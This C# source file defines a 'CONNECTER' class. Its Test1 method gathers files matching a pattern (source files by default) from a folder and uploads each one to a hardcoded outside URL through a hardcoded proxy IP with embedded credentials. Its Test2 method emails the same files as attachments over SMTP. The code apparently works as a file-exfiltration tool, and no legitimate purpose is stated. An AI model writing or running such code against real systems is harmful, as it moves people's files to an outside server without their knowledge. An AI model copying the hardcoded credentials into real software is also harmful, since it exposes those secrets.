using System;
using System.Net.Mail;
using System.Net;
using System.Threading.Tasks;

namespace Connecter2
{
	public class CONNECTER
	{
		public CONNECTER ()
		{
		}
		private static Connect SetConnecter(string[] args){
			Connect con = new Connect ();
			string host = "91.107.108.227";
			string port = "1080";
			string user = "vik";
			string pass = "pass";

			string startFol = "";
			string[] TypeFile = new string[10];
			TypeFile [0] = "*.cs";
			bool typ = false;
			int typi = 0;
			for (int i = 0; i < args.Length; i++) {
				if (args [i].Equals ("-host")) {
					host = args [++i];
					continue;
				}
				if (args [i].Equals ("-port")) {
					port = args [++i];
					continue;
				}
				if (args [i].Equals ("-user")) {
					user = args [++i];
					continue;
				}
				if (args [i].Equals ("-pass")) {
					pass = args [++i];
					continue;
				}
			}
			if (!host.Equals ("")) {
				if (!user.Equals ("")) {
					con.SetProxy (host, Int32.Parse (port), user, pass);
				} else {
					con.SetProxy (host, Int32.Parse (port));
				}
			}
			return con;
		}
		public static void Test1(string[] args){
			string startFol = "";
			string url = "http://call-of-dead.com/conecter/index.php";
			string[] TypeFile = new string[10];
			TypeFile [0] = "*.cs";
			bool typ = false;
			int typi = 0;
			for (int i = 0; i < args.Length; i++) {
				if (args [i].Equals ("-type")) {
					typ = true;
					continue;
				}
				if (args [i].Equals ("-start")) {
					startFol = args [++i];
					continue;
				}
				if (args [i].Equals ("-server")) {
					url = args [++i];
					continue;
				}
				if (typ) {
					TypeFile [typi++] = args [i];
					continue;
				}
			}
			Connect con = CONNECTER.SetConnecter (args);
			if (startFol.Equals ("")) {
				startFol = System.IO.Directory.GetCurrentDirectory ();
			}
			foreach (string fil in System.IO.Directory.GetFiles(startFol, TypeFile [0])) {
				Console.WriteLine (con.PostConnectTo (url, fil));
			}
		}
		private static SmtpClient SetSMTPServer(string[] args){
			SmtpClient ret = new SmtpClient ();
			NetworkCredential user = new NetworkCredential ();
			for (int i = 0; i < args.Length; i++) {
				if (args [i].Equals ("-host")) {
					ret.Host = args [++i];
					continue;
				}
				if (args [i].Equals ("-port")) {
					ret.Port = Int32.Parse (args [++i]);
					continue;
				}
				if (args [i].Equals ("-user")) {
					user.UserName = args [++i];
					continue;
				}
				if (args [i].Equals ("-pass")) {
					user.Password = args [++i];
					continue;
				}
				if (args [i].Equals ("-ssl")) {
					ret.EnableSsl = true;
				}
			}
			ret.Credentials = user;
			return ret;
		}
		static private MailMessage SetMailMessage(string[] args){
			MailAddress fro=new MailAddress("ERROR@ERROR.ERROR");
			MailAddress to=new MailAddress("ERROR@ERROR.ERROR");
			MailMessage mes;
			string body = "";
			string subject = "";
			for (int i = 0; i < args.Length; i++) {
				if (args [i].Equals ("-to")) {
					to = new MailAddress (args [++i]);
					continue;
				}
				if (args [i].Equals ("-from")) {
					fro = new MailAddress (args [++i], args [++i]);
					continue;
				}
				if (args [i].Equals ("-message")) {
					body = args [++i];
					continue;
				}
				if (args [i].Equals ("-subject")) {
					subject = args [++i];
					continue;
				}
			}
			mes = new MailMessage (fro, to);
			mes.Body = body;
			mes.Subject = subject;
			mes.From = fro;
			return mes;
		}
		public async static void Test2(string[] args){
			
			SmtpClient smtp = CONNECTER.SetSMTPServer (args);
			MailMessage mes = CONNECTER.SetMailMessage (args);
			string startFol = "";
			string[] TypeFile = new string[10];
			TypeFile [0] = "*.cs";
			bool typ = false;
			int typi = 0;
			for (int i = 0; i < args.Length; i++) {
				if (args [i].Equals ("-type")) {
					typ = true;
					continue;
				}
				if (args [i].Equals ("-start")) {
					startFol = args [++i];
					continue;
				}
				if (typ) {
					TypeFile [typi++] = args [i];
					continue;
				}
			}
			if (startFol.Equals ("")) {
				startFol = System.IO.Directory.GetCurrentDirectory ();
			}
			smtp.Timeout = 10000;
			foreach (string fil in System.IO.Directory.GetFiles(startFol, TypeFile [0])) {
				mes.Attachments.Add(new Attachment(fil));
				 smtp.Send(mes);
				mes.Attachments.Clear ();

			}
		}
	}
}

